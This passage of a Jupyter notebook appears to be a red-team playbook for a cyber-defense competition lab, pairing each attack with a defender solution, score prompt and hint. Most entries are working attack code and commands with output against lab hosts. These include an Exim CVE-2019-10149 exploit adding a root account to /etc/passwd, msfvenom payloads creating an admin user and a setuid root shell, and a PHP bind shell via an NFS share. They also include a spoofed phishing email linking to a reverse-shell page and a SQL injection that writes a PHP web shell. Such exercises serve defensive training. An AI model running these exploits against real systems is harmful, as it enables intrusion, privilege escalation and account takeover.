    "### solution\n",
    "Vulnerability in the code at `/usr/local/apache2/htdocs/index.php`.\n",
    "Specifically, the `shell_exec(\"date --date='TZ=\\\"America/\" . $tz .\"\\\"'\")`\n",
    "allows the exploit to work.\n",
    "\n",
    "Probably multiple ways, but using PHP's `escapeshellarg` as such works\n",
    "`$tz=escapeshellarg($_GET['tz']);`.\n",
    "They must maintain expected functionality of being able to pass an arbitrary\n",
    "timezone.\n",
    "\n",
    "### score chat\n",
    "> Hackers are extracting data from the system, find out how and fix it.\n",
    "\n",
    "### hint\n",
    "> Web logs tell a lot\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.507\n",
    "<a id='ref507'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "SMTP account enumeration [baked], win2012, medium\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "cat > smtp_enum_emails.txt << EOF\n",
    "mike@windfarm.local\n",
    "jenny@windfarm.local\n",
    "martha@windfarm.local\n",
    "larry@windfarm.local\n",
    "admin@windfarm.local\n",
    "green@windfarm.local\n",
    "curly@windfarm.local\n",
    "green1@windfarm.local\n",
    "moe@windfarm.local\n",
    "EOF\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "f = open(\"additionalFiles/smtp_enum_emails.txt\", \"w\")\n",
    "f.write(\"mike@windfarm.local\\njenny@windfarm.local\\nmartha@windfarm.local\\nlarry@windfarm.local\\nadmin@windfarm.local\\ngreen@windfarm.local\\ncurly@windfarm.local\\ngreen1@windfarm.local\\nmoe@windfarm.local\")\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "ismtp -h 10.X.Y.7:25 -e smtp_enum_emails.txt -l 2\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing: ismtp -h 127.0.0.1:25 -e additionalFiles/smtp_enum_emails.txt -l 2\n",
      "b'\\n ---------------------------------------------------------------------\\n \\x1b[1;37m iSMTP v1.6 - SMTP Server Tester, Alton Johnson (alton.jx@gmail.com)\\n \\x1b[0;00m---------------------------------------------------------------------\\n \\n Testing SMTP server [user enumeration]: 127.0.0.1:25\\n Emails provided for testing: 9\\n\\n\\x1b[1;31m Error: [Errno 111] Connection refused\\x1b[0;00m\\n\\n-----\\nCompleted in: 3.6s\\n\\n'\n"
     ]
    }
   ],
   "source": [
    "# File is saved with the additional files in the Jupyter Notebook\n",
    "emailList='additionalFiles/smtp_enum_emails.txt'\n",
    "url = win2k12 + \":25\"\n",
    "command = \"ismtp -h \" + win2k12 + \":25 -e \" + emailList + \" -l 2\"\n",
    "print(\"Executing: \" + command)\n",
    "p = subprocess.Popen(['ismtp', '-h', url, '-e', emailList, '-l', '2'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n",
    "#print(p.communicate())\n",
    "print(str(p.stdout.read()))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "*NOTE*: Only two, intentional, will show as valid.\n",
    "need to install `ismtp`\n",
    "```bash\n",
    "apt-get install ismtp\n",
    "```\n",
    "\n",
    "### solution\n",
    "Check email logs at `C:\\Program Files\\hMailServer\\Logs\\hmailserver_YYYY-MM-DD.log`\n",
    "Should be `admin@windfarm.local` and `green1@windfarm.local`\n",
    "\n",
    "### score chat\n",
    "> Find out what accounts the hackers were able to succesfully harvest.\n",
    "\n",
    "### hint\n",
    "> check email logs under `C:\\Program Files\\hMailServer\\Logs`.\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.508\n",
    "<a id='ref508'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "scan ICS modbus\n",
    "\n",
    "### exploit\n",
    "There is an ISC attacking tool located at general-redteam-2020/ICS/cfc_modbus.py \n",
    "* Note you will need to install pymodbus `pip install pymodbus`\n",
    "\n",
    "run the command `python cfc_modbus.py 10.X.Y.8 read-all`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "python cfc_modbus.py 10.5.2.8 read-all\n"
     ]
    }
   ],
   "source": [
    "print(\"python cfc_modbus.py \" + plc + \" read-all\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This will dump the contents of all modbus regestries \n",
    "\n",
    "### solution\n",
    "\n",
    "### score chat\n",
    "> the hacker was able to read the status of all your PLC devices, find out how\n",
    "### hint\n",
    "listen to the traffic to .8\n",
    "\n",
    "### note\n",
    "After this play, you can do a fun bonus points 2 points: \n",
    "> For 2 fun bonus points, what do you think about the comeptition so far? \n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.600\n",
    "<a id='ref600'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "Exim4 cve-2019-10149 exploit [baked], ubuntu 18.04, hard\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "python3 exim_poc.py -s 10.X.Y.5:25 -c \"echo 'debbie:FroTFHw2fhTPM:0:0::/root:/bin/bash' >> /etc/passwd\"\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "python3 exim_poc.py -s 127.0.0.1:25 -c \"echo 'debbie:FroTFHw2fhTPM:0:0::/root:/bin/bash' >> /etc/passwd\"\n"
     ]
    }
   ],
   "source": [
    "print(\"python3 exim_poc.py -s \" + ubuntu + \":25 -c \\\"echo 'debbie:FroTFHw2fhTPM:0:0::/root:/bin/bash' >> /etc/passwd\\\"\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### solution\n",
    "An exploit for Exim4, CVE-2019-10149, was leveraged to add a root level user to\n",
    "the system.  Specifically, the username is `debbie` with a password of `ehlo`\n",
    "however, they will only be able to see the `/etc/passwd` file contains the value\n",
    "`debbie:FroTFHw2fhTPM:0:0::/root:/bin/bash` (two times).\n",
    "\n",
    "### score chat\n",
    "> A service on ubuntu was exploited, find out what happened for X points\n",
    "\n",
    "### hint\n",
    "> the service was running on port 25\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.601\n",
    "<a id='ref601'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "HMI phpmyadmin default creds\n",
    "\n",
    "### exploit\n",
    "http://10.X.Y.9/phpmyadmin/index.php"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "URL: http://10.5.2.9/phpmyadmin/index.php\n"
     ]
    }
   ],
   "source": [
    "print(\"URL: http://\" + hmi + \"/phpmyadmin/index.php\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "creds: `root`/`password`\n",
    "\n",
    "click on `data_historian` -> `modbus_registries` and `turbines`\n",
    "\n",
    "\n",
    "### solution\n",
    "check the `C:\\Bitnami\\wampstack-7.4.10-0\\apache2\\logs\\access`\n",
    "```\n",
    "GET /phpmyadmin/sql.php?server=1&db=data_historian&table=modbus_registries&pos=0 HTTP/1.1\" 200 14164\n",
    "```\n",
    "\n",
    "### score chat\n",
    "> hacker was able to grab the PLC register values and and turbine locations, how did they do it?\n",
    "\n",
    "### hint\n",
    "> It's happening on `10.X.Y.9`\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.602\n",
    "<a id='ref602'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "ssh \"shellshock\" like [baked], ubuntu 18.04, medium\n",
    "\n",
    "### exploit\n",
    "Normally, the `asedwortho` user should be forced to execute the `uptime` command\n",
    "and then exit.  Try `sshpass -p 'Open-source' ssh asedwortho@10.0.0.5` for an\n",
    "example.  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "sshpass -p 'Open-source' ssh asedwortho@127.0.0.1\n"
     ]
    }
   ],
   "source": [
    "print(\"sshpass -p 'Open-source' ssh asedwortho@\" + ubuntu)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "However, the following will give you shell access:\n",
    "`sshpass -p 'Open-source' ssh asedwortho@10.0.0.5 bash -il`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "sshpass -p 'Open-source' ssh asedwortho@127.0.0.1 bash -il\n"
     ]
    }
   ],
   "source": [
    "print(\"sshpass -p 'Open-source' ssh asedwortho@\" + ubuntu + \" bash -il\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### solution\n",
    "The SSH daemon is not honoring/enforcing the `ForceCommand` option and allowing\n",
    "the `asedwortho` user to bypass the restriction.\n",
    "After figuring it out, give the blueteam the patched binary `sshd.fixed`\n",
    "(we provide) and restart the service.\n",
    "\n",
    "Note: Replace the sshd.fixed with sshd that they have.  May have to transfer file to the box for them.\n",
    "\n",
    "### score chat\n",
    "> an account is logged in with a shell and shouldn't be, find out how they got in\n",
    "\n",
    "### hint\n",
    "> check the SSH logs\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.603\n",
    "<a id='ref603'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "Writeable FTP directory [baked], win2012, medium\n",
    "\n",
    "### notes\n",
    "NOTE: For the test range only, this service may be stopped and need to be\n",
    "started (it, as intended, consumes a lot of CPU when running constantly).\n",
    "So, from a `cmd.exe` prompt:\n",
    "```posh\n",
    "sc stop jumpftp\n",
    "sc start jumpftp\n",
    "```\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "msfvenom --format exe --payload windows/adduser USER=hacker PASS=L33t@xor --out malware.exe;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing: msfvenom --payload windows/adduser USER=hacker PASS=L33t@xor --out additionalFiles/malware.exe\n",
      "b'[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\\n[-] No arch selected, selecting arch: x86 from the payload\\nNo encoder or badchars specified, outputting raw payload\\nPayload size: 270 bytes\\nSaved as: additionalFiles/malware.exe\\n'\n"
     ]
    }
   ],
   "source": [
    "payloadpath = \"additionalFiles/malware.exe\"\n",
    "command = \"msfvenom --payload windows/adduser USER=hacker PASS=L33t@xor --out \" + payloadpath\n",
    "print(\"Executing: \" + command)\n",
    "p = subprocess.Popen(['msfvenom', '--payload', 'windows/adduser', 'USER=hacker', 'PASS=L33t@xor', '--out', payloadpath], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n",
    "#print(p.communicate())\n",
    "print(str(p.stdout.read()))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "ftp -inv 10.X.Y.7 << EOF\n",
    "user green1 blueberry\n",
    "binary\n",
    "passive\n",
    "put malware.exe\n",
    "exit\n",
    "EOF\n",
    "```\n",
    "\n",
    "If you can't get the above to work, do the below one line at a time:\n",
    "```bash\n",
    "msfvenom --format exe --payload windows/adduser USER=hacker PASS=L33t@xor --out malware.exe;\n",
    "ftp 10.X.Y.7\n",
    "green1\n",
    "blueberry\n",
    "binary\n",
    "passive\n",
    "put malware.exe\n",
    "exit\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "ftpFile=\"additionalFiles/commands_ftp.txt\"\n",
    "f = open(ftpFile, 'w')\n",
    "f.write(\"open \" + win2k12 + \"\\nuser green1 blueberry\\npassive on\\nput \" + ftpFile + \"\\nls\\nquit\")\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Then execute from the jupyter directory: \n",
    "ftp < additonalFiles/commands_ftp.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### solution\n",
    "File was uploaded via FTP and to the `C:\\ftpserver\\anonymous` directory.\n",
    "For the additional points (`strings` FTW), it is basically:\n",
    "```posh\n",
    "cmd.exe /c net user hacker L33t@xor /ADD && net localgroup Administrators hacker /ADD\n",
    "```\n",
    "\n",
    "score chat: \"\n",
    "### score chat\n",
    "> The attacker has uploaded malware.exe, find it and remove it. Discover how it was uploaded\n",
    "[additonal points for describing what the malware does]\n",
    "\n",
    "### hint\n",
    "> Check your FTP service and upload directory.\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.604\n",
    "<a id='ref604'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "open relay spam email [baked], win2012, medium\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "echo -e \"click this link for a free macbook.\\nhttp://10.X.Y.Z/exploitx\" | \\\n",
    "  sendemail \\\n",
    "    -o fqdn=amazon.local \\\n",
    "    -f easymoney@windfarm.local \\\n",
    "    -t mike@amazon.local \\\n",
    "    -u \"free macbook\" \\\n",
    "    -s 10.X.Y.7:25\n",
    "```\n",
    "\n",
    "The below code creates the phishing email..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "phishingEmail = \"additionalFiles/phishingEmail.txt\"\n",
    "revshellIP = \"10.8.0.1:7777\"\n",
    "revshellFile = \"/revshell.php\"\n",
    "f = open(phishingEmail, \"w\")\n",
    "subject=\"Free Macbook\"\n",
    "f.write(\"Click this link for a free Mac Book\\n\")\n",
    "f.write(\"http://\" + revshellIP + revshellFile)\n",
    "f.write(\"\\n\")\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The below code sends the phishing email..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "recipient='easymoney@windfarm.local'\n",
    "spoofeddomain=\"amazon.local\"\n",
    "spoofedsender=\"mike@\" + spoofeddomain\n",
    "\n",
    "\n",
    "command=\"cat \" + phishingEmail + \" | sendemail -o fqdn=\" + spoofeddomain + \" -f \" + recipient + \" -t \" + spoofedsender + \" -u \" + subject + \" -s \" + win2k12\n",
    "print(\"Executing the following: \" + command)\n",
    "#os.system(command)\n",
    "p = subprocess.Popen(['cat', phishingEmail], stdout=subprocess.PIPE)\n",
    "output = subprocess.check_output(['sendemail', '-o', 'fqdn=' + spoofeddomain, '-f', recipient, '-t', spoofedsender, '-u', subject, '-s', win2k12], stdin=p.stdout, stderr=subprocess.STDOUT)\n",
    "print(p.communicate())\n",
    "#print(str(output.stdoutread()))\n",
    "\n",
    "# Errors may occur if port 25 is down!!!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "*NOTE*: One can do a quick test via `ismtp -h 10.X.Y.7 -x -i mike@amazon.local` which\n",
    "will display `External SMTP relay enabled.` if possible, however it will not actually\n",
    "send anything so it does not meet the need of this task.\n",
    "\n",
    "### solution\n",
    "show email log evidence of the spoofed email.\n",
    "\n",
    "### score chat\n",
    "> Amazon.local claims that they are receiving spam from your mail server, identify the spam email that was sent\n",
    "\n",
    "### hint\n",
    "> the email logs are located at `C:\\Program Files\\hMailServer\\Logs`\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.605\n",
    "<a id='ref605'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "insecure NFS share [baked], ubuntu 18.04, medium\n",
    "\n",
    "### exploit\n",
    "Test if mounts exported (and thus potentially exploitable): `showmount -e 10.X.Y.5`\n",
    "\n",
    "As `root` (or privilleged user),\n",
    "```bash\n",
    "mkdir -p /mnt/nfs\n",
    "mount -t nfs 10.X.Y.5:/ /mnt/nfs\n",
    "cd /mnt/nfs/usr/local/apache2/htdocs/\n",
    "msfvenom --payload linux/x64/exec CMD=/bin/bash PrependSetreuid=true --format elf --out gimmeroot\n",
    "chmod 4555 gimmeroot\n",
    "echo '<?php' > gimmeroot.php\n",
    "msfvenom --payload php/bind_perl LPORT=12321 >> gimmeroot.php\n",
    "echo -e '\\n?>' >> gimmeroot.php\n",
    "chmod 444 gimmeroot.php\n",
    "```\n",
    "Browse to `http://10.X.Y.5/gimmeroot.php` (e.g., `curl -s http://10.X.Y.5/gimmeroot.php`)\n",
    "to kick off the bind shell, then connect via (either/or):\n",
    "1) netcat `nc -nv 10.X.Y.5 12321`\n",
    "2) metasploit\n",
    "```bash\n",
    "msfconsole\n",
    "use exploit/multi/handler\n",
    "set payload php/bind_perl\n",
    "set LPORT 12321\n",
    "set RHOST 10.X.Y.5\n",
    "run\n",
    "```\n",
    "\n",
    "Finally, at a shell prompt execute `./gimmeroot`\n",
    "(`id -a` should show something like `uid=0(root) gid=1(daemon) groups=1(daemon)`).\n",
    "\n",
    "Identify if the NFS Share is Vulnerable..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing: showmount -e 10.1.102.5\n",
      "b'Export list for 10.1.102.5:\\n/data/ftp_share 10.0.0.0/8\\n/usr            10.0.0.0/8\\n/etc            10.0.0.0/8\\n'\n"
     ]
    }
   ],
   "source": [
    "command = \"showmount -e \" + ubuntu\n",
    "print(\"Executing: \" + command)\n",
    "p = subprocess.Popen(['showmount', '-e', ubuntu], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n",
    "#print(p.communicate())\n",
    "print(str(p.stdout.read()))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If Vulnerable, Mount NFS Share"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "currentpath = os.getcwd()\n",
    "nfsmount = currentpath + \"/nfs\"\n",
    "if not os.path.exists(nfsmount):\n",
    "    os.makedirs(nfsmount)\n",
    "    print(\"Created path for NFS Mount: \" + nfsmount)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As root or a privileged user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "sudo mount -t nfs 10.1.102.5:/ /home/kali/CyberForce/jupyter/nfs\n"
     ]
    }
   ],
   "source": [
    "print (\"sudo mount -t nfs \" + ubuntu + \":/ \" + nfsmount)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Generate the setreuid file to privilege escalate as root (NFS share allows root privileges to be inheritted from host)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing: msfvenom --payload linux/x64/exec CMD=/bin/bash PrependSetreuid=True --format elf --out additionalFiles/gimmeroot\n",
      "b'[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\\n[-] No arch selected, selecting arch: x64 from the payload\\nNo encoder or badchars specified, outputting raw payload\\nPayload size: 63 bytes\\nFinal size of elf file: 183 bytes\\nSaved as: additionalFiles/gimmeroot\\n'\n"
     ]
    }
   ],
   "source": [
    "payloadpath = \"additionalFiles/gimmeroot\"\n",
    "command = \"msfvenom --payload linux/x64/exec CMD=/bin/bash PrependSetreuid=True --format elf --out \" + payloadpath\n",
    "print(\"Executing: \" + command)\n",
    "p = subprocess.Popen(['msfvenom', '--payload', 'linux/x64/exec', 'CMD=/bin/bash', 'PrependSetreuid=True', '--format', 'elf', '--out', payloadpath], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n",
    "#print(p.communicate())\n",
    "print(str(p.stdout.read()))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Generate the php file to execute as the web user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing: msfvenom --payload php/bind_perl LPORT=12321 --out additionalFiles/prel.info\n",
      "b'[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\\n[-] No arch selected, selecting arch: php from the payload\\nNo encoder or badchars specified, outputting raw payload\\nPayload size: 230 bytes\\nSaved as: additionalFiles/prel.info\\n'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "phppayloadpath=\"additionalFiles/gimmeroot.php\"\n",
    "perlpath=\"additionalFiles/prel.info\"\n",
    "\n",
    "phpcommand = \"echo '<?php' > \" + phppayloadpath\n",
    "os.system(phpcommand)\n",
    "\n",
    "# Generate the metasploit payload for a bind shell\n",
    "command = \"msfvenom --payload php/bind_perl LPORT=12321 --out \" + perlpath\n",
    "print(\"Executing: \" + command)\n",
    "p = subprocess.Popen(['msfvenom', '--payload', 'php/bind_perl', 'LPORT=12321', '--out', perlpath], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n",
    "#print(p.communicate())\n",
    "print(str(p.stdout.read()))\n",
    "\n",
    "phpcommand = \"cat \" + perlpath + \" >> \" + phppayloadpath\n",
    "os.system(phpcommand)\n",
    "\n",
    "phpcommand = \"echo '\\n?>' >> \" + phppayloadpath\n",
    "os.system(phpcommand)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Copy the files generated to the nfs mount specifically where the web server files are located\n",
    "\n",
    "Run the following output as root or a privileged user (setup for sudo)\n",
    "\n",
    "cd /mnt/nfs/usr/local/apache2/htdocs/ chmod 4555 gimmeroot echo '<?php' > gimmeroot.php chmod 444 gimmeroot.php"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "sudo cp additionalFiles/gimmeroot /home/kali/CyberForce/jupyter/nfs/usr/local/apache2/htdocs/\n",
      "sudo chmod 4555 /home/kali/CyberForce/jupyter/nfs/usr/local/apache2/htdocs/gimmeroot\n",
      "sudo cp additionalFiles/gimmeroot.php /home/kali/CyberForce/jupyter/nfs/usr/local/apache2/htdocs/\n",
      "sudo chmod 444 /home/kali/CyberForce/jupyter/nfs/usr/local/apache2/htdocs/gimmeroot.php\n"
     ]
    }
   ],
   "source": [
    "print(\"sudo cp \" + payloadpath + \" \" + nfsmount + \"/usr/local/apache2/htdocs/\")\n",
    "print(\"sudo chmod 4555 \" + nfsmount + \"/usr/local/apache2/htdocs/gimmeroot\")\n",
    "print(\"sudo cp \" + phppayloadpath + \" \" + nfsmount + \"/usr/local/apache2/htdocs/\")\n",
    "print(\"sudo chmod 444 \" + nfsmount + \"/usr/local/apache2/htdocs/gimmeroot.php\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Browse, establish connection, and escalate privileges¶\n",
    "\n",
    "Browse to http://10.X.Y.5/gimmeroot.php (e.g., curl -s http://10.X.Y.5/gimmeroot.php) to kick off the bind shell, then connect via (either/or):\n",
    "\n",
    "Ubuntu firewall needs to be down... netcat nc -nv 10.X.Y.5 12321\n",
    "\n",
    "Finally, at a shell prompt execute ./gimmeroot (id -a should show something like uid=0(root) gid=1(daemon) groups=1(daemon)).\n",
    "\n",
    "Execute the following commands generated by the output\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "URL: http://10.1.102.5/gimmeroot.php\n",
      "\n",
      "nc -nv 10.1.102.5 12321\n",
      "\n",
      "Through the shell execute ./gimmeroot\n",
      "\n",
      "Execute: id -a    # To verify you are root\n"
     ]
    }
   ],
   "source": [
    "print(\"URL: http://\" + ubuntu + \"/gimmeroot.php\")\n",
    "print(\"\\nnc -nv \" + ubuntu + \" 12321\")\n",
    "print(\"\\nThrough the shell execute ./gimmeroot\")\n",
    "print(\"\\nExecute: id -a    # To verify you are root\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### solution\n",
    "Can see exploit, but three parts:\n",
    "1) The NFS export `/usr` has the option `no_root_squash` set. (this allows execution of 3 below)\n",
    "2) Uploaded a web shell to `/usr/local/apache2/htdocs/` called `gimmeroot.php`.\n",
    "   Which was used for initial access.\n",
    "3) Uploaded a SETUID binary (same location).  Which was used for privilleged access.\n",
    "\n",
    "### score chat\n",
    "> Those evil hackers are running commands as root, find out how they did it.\n",
    "\n",
    "### hint\n",
    "> the web root is shared via the NFS share\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.606\n",
    "<a id='ref606'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "configure new NTP server [n/a - we tell blue how to do it], win2016, easy\n",
    "\n",
    "### exploit\n",
    "N/A\n",
    "\n",
    "### solution\n",
    "(use administrator cmd.exe not powershell)\n",
    "```posh\n",
    "sc stop w32time\n",
    "sc start ntp\n",
    "```\n",
    "verify with:\n",
    "```posh\n",
    "ntpdc -c peers 10.X.Y.6\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ntpdc -c peers 127.0.0.1\n"
     ]
    }
   ],
   "source": [
    "print(\"ntpdc -c peers \" + win2k16)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### score chat\n",
    "> Updated company policy is to run the new nptd service. Configure your system to get the more secure ntpd running.\n",
    "\n",
    "### hint\n",
    "```posh\n",
    "sc stop w32time\n",
    "sc start ntp\n",
    "```\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.607\n",
    "<a id='ref607'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "SQL injection lateral movement to RCE on Win2012 [inject], ubuntu 18.04, hard\n",
    "\n",
    "### exploit\n",
    "After the white team inject for this, the web page `http://10.X.Y.5/info.php`\n",
    "should allow `http://10.X.Y.5/info.php?query=174` (or any of the numbers on the\n",
    "original page).\n",
    "However, the updated code also allows\n",
    "1. `http://10.X.Y.5/info.php?query=174%20union%20all%20select%201,%202,%20@@version`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://\" + ubuntu + \"/info.php?query=174%20union%20all%20select%201,%202,%20@@version\"\n",
    "print(\"URL: \" + url)\n",
    "x = requests.get(url)\n",
    "if (x.status_code == 200):\n",
    "    print(\"SQL Injection was successful.\")\n",
    "    print(x.text)\n",
    "else:\n",
    "    print(\"SQL Injection was not successful\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. `http://10.X.Y.5/info.php?query=174%20union%20all%20select%201,%202,%20table_name%20from%20information_schema.tables`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://\" + ubuntu + \"/info.php?query=174%20union%20all%20select%201,%202,%20table_name%20from%20information_schema.tables\"\n",
    "print(\"URL: \" + url)\n",
    "x = requests.get(url)\n",
    "if (x.status_code == 200):\n",
    "    print(\"SQL Injection was successful.\")\n",
    "    print(x.text)\n",
    "else:\n",
    "    print(\"SQL Injection was not successful\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. `http://10.X.Y.5/info.php?query=174%20union%20all%20select%201,%202,%20%22%3C?php%20echo%20shell_exec($_GET%5B'cmd'%5D);?%3E%22%20into%20outfile%20'c:/php-test/info.php'`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://\" + ubuntu + \"http://10.X.Y.5/info.php?query=174%20union%20all%20select%201,%202,%20%22%3C?php%20echo%20shell_exec($_GET%5B'cmd'%5D);?%3E%22%20into%20outfile%20'c:/php-test/info.php'\"\n",
    "print(\"URL: \" + url)\n",
    "x = requests.get(url)\n",
    "if (x.status_code == 200):\n",
    "    print(\"SQL Injection was successful placing a shell on \" + win2k12 + \".\")\n",
    "    print(x.text)\n",
    "else:\n",
    "    print(\"SQL Injection was not successful\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "  - *NOTE*: a `Warning` similar to `Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /usr/local/apache2/htdocs/info.php on line 26` is expected.\n",
    "4.  `http://10.X.Y.7:8000/info.php?cmd=dir`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
